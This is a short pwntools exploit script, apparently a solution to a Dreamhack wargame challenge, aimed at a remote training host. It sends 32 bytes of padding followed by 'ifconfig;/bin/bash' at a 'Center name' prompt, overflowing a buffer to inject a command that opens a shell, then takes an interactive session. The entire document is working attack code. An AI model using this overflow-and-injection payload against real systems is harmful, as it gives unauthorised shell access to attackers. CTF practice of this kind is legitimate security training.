from pwn import * 

p = remote("host1.dreamhack.games", 18773) 

payload = "A" * 32 
payload += "ifconfig" 
payload += ";" + "/bin/bash" 

p.recvuntil("Center name: ") 

p.sendline(payload) 

p.interactive()